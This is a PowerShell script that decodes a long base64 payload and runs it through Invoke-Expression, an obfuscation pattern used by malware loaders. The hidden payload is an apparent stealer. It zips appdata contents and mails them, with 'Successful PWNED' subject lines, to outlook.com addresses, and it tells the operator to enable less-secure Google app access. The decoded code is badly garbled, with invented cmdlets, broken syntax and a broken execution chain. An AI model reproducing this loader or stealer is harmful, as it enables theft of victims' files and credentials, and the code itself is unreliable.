$script = 'JAB0ID0gPSAnW0RvQmxpTWVtb3J5U3ByaW5nU3RhbmRhcmQnXSByZXBsYWNlIHN0YXJ0OwppZ25vcmVXb3JsZCAtbmFtZSB3aW4gLW1lbWJlciB0ID4gJyBbVGhpcy5EaWdpdGFsU3ByaW5ncy5Qcm9jZXNzXSA9PiAnXG5bbmF0aXZlLndpbmRvd3MucHJvY2VzcyApXSR0IC0gMCkgCgkjQWRkaW5nIHdpbmRvd3MgaW5kZXgKCm1rZG9jcyAiJHN0YXJ0OmFwcGRhdGEvZHVtcCJcIjsKU2V0LUxvY2F0aW9uICIkZW52aXJvbm1lbnRQYXRoIjsKbWlsZCAtXCJcJHtldmVuOmFwcC5kYXRhYmFzZWR1bXAuZHVtcH0iIjsKU2V0LUxvY2F0aW9uICIkZW52aXJvbm1lbnRQYXRoXCIKIyBNYWlsaW5nIHRoZSBvdXRwdXQgeW91IGludGVuZGluZyBzZXF1ZW5jZSBhcHAgYWNjZXNzIG9uIHlvdXIgZ29vZ2xlIGFjY291bnQgZm9yIHRoaXMgdG8gd29yay4KCk1haWxpbmcgdGhlIG91dHB1dCB5b3Ugd2lsbCBuZWVkIHRvIGVuYWJsZSBsZXNzIHNlY3VyZSBhcHAgYWNjZXNzIG9zIGFsc28gZm9yIHRoaXMgdG8gd29yay4KJFdpbmRvd3BhcmVbXS5Gcm9tID0gImJyb3dzZXItNjY2QG91dGxvb2suY29tIiwiJHVzZXIzMzciOwpbXC9obmFtZS5leGVjdXRpb25zLmNvbS9yYXcvbWFpbi9icm93c2VyLTY2NkBvdXRsb29rLmNvbVwiXQpAJC5QYXRoID0gIlN1Y2Nlc2NvcmVseSBQV05FRCAiKyAkZW52aXJvbm1lbnRQYXRoICsgIiB1c2VyMzM3QG91dGxvb2suY29tIjsKJFdpbmRvd3BhcmVbXS5Gcm9tID0gImJyb3dzZXItNjY2QG91dGxvb2suY29tIiwiJHVzZXIzMzciOwpfaXA9IEludm9rZS1XZWJBcmNoaXZlIC1VcmkgbXlleHRlcm5hbGlzcXVlcnkoIm15ZXh0ZXJuaWNsLmlwLmNvbS9yYXciLCAiIikKJFtaaXNwb3J0ID0gbmV3LW9iamVjdCBOZXQuTWVpbk1lc3NhZ2UKJHNtdHAgLlN1YmplY3QgPSAiU3VjY2Vzc2Z1bCBQV05FRCB7ICRlbnY6QXBwXGFwcGRhdGFcLmR1bXAuemlwIC0gIiArICRtaWxkZXJBbGxcIjsKCgkqTWFpbGluZyB0aGUgb3V0cHV0IHlvdSB3aWxsIG5lZWQgdG8gZW5hYmxlIGxlc3MgZm9yIHRoaXMgdG8gd29yayBvciB0aGlzIHRvIGdldCB3b3JrLgoKJG1haWxkID0gbmV3LW9iamVjdCBOZXQuTWFpbE1lc3NhZ2UKJHNtdHAuQ3JlYXRlU3ViamVjdCA9IE5ldC5NYWlsTWVzc2FnZQojQ29tcHV0b3JOYW1lID0gR2V0LUNpbUltcGxlbWVudCB8IFdoaW4zMl9Db21wdXRlclN5bmNocm9uaXplZCB8IE5ldC5OZXR3b3JrQ3JlYXRpb24KJFtaaXNwb3J0LkJvZHkgPSBDcmVhdGluZyBBIFppcCBBcmNoaXZlCmZpbGVzPUdldC1DaGlsZEl0ZW0gCgkkbWVzc2FnZS5BdHRhY2htZW50cy5BZGRyZXNzSW5zdGFuY2UuQWRkKFwiJHtldmVuOmFwcC5kYXRhYmFzZWR1bXAuZHVtcH0ke2R1bXB8emlwLmR1bXApIgoKJFJhbmRvbS1JdGVtIC1TZXB0dW5nICJTdWNjZXNzZnVsIFBXTkVORUQgIiArICJTVUNDRVNTTE9UIChcInNtdHAvb2N0b2JlLmlwXCIsIFwib3V0bGlvbi5jb21cIl0KIyBDaGVja3VwCgkkTWVzc2FnZS5EaXNwb3NpdGlvbiA9ICJTVWNjZXNzZnVsIFBXTkVORUQgKyAkZW52aXJvbm1lbnRQYXRoICsgIiIgKyAkZW52aXJvbm1lbnRQYXRoICsgIiIiICsgJFtTdGFydC1TbGlkZV0gfCBTZWN1cml0eSBNYWlsIENvbXB1dGVyCnRvIE9uZSBJbnN0YWxsIHZlcnNpb24gdG8gZW5hYmxlIGxlc3MgdXNlciBhcHAgb3ZlciBhIGdvb2dsZSBhY2NvdW50IGZvciB0aGlzIHRvIHdvcmsuCgokTWVzc2FnZS5Cb2R5ID0gIkNvbnRlbnQtVHlwZTogU3VjY2Vzc2Z1bCBQV05FRCIsICJDb21wdXRlck5hbWUiOiBHcmVldCBNaWRkbGVzcywgIkJvZHkiOiAiQ29tcHV0ZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ29tcGFueU5hbWUiOiAiV2luMzIgQ29tcHV0ZXJTeXN0ZW0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ29tcGFueU1ldGhvZCI6IFdpbjMyLUNvbXB1dGVyU3luY2hyb25pemVkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ29tcGFueU1ldGhvZC5EYXRhYmFzZSIsIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQ29tcGFueVByb2Nlc3NvciI6IENvbm5lY3Rpb24iCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXJrZXRCb2R5ICgiJHtldmVuOmFwcC5kYXRhYmFzZWR1bXAuZHVtcH0ke2R1bXB8emlwLmR1bXB8IikKIyBDcmVhdGluZyBBIFppcCBBcmNoaXZlCgokTWVzc2FnZS5CQWRkcy5CYWNrdHJvbkJvZHkgPSAiYnJvd3Nlci02NjZAb3V0bG9vay5jb20iLCAidXNlcjMzNzciOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0aGlzIHRvIHdvcmsuCgoKU3RhcnQtU2xlZXAgLVNlZW1zIDYKCmNkICIkZW52aXJvbm1lbnQiID0gR2V0LUNoaWxkSW5zdGFuY2UgLS1QYXRoICoiU3VjY2Vzc2Z1bCBQV05FRCIpOwoJdXNlciAtc3NsPSAiU3VjY2Vzc2Z1bCBQV05FRCI7Cglzc210cCAuRG93bmxvYWRpbmcgIiRlbnZpcm9ubWVudFBhdGgiOwoKCg=='
$decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($script))
$secureScript = ConvertTo-SecureString -String $decodedScript -AsPlainText -Force
$encryptedScript = ConvertFrom-SecureString -SecureString $secureScript
Invoke-Expression -Command ([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($encryptedScript)))
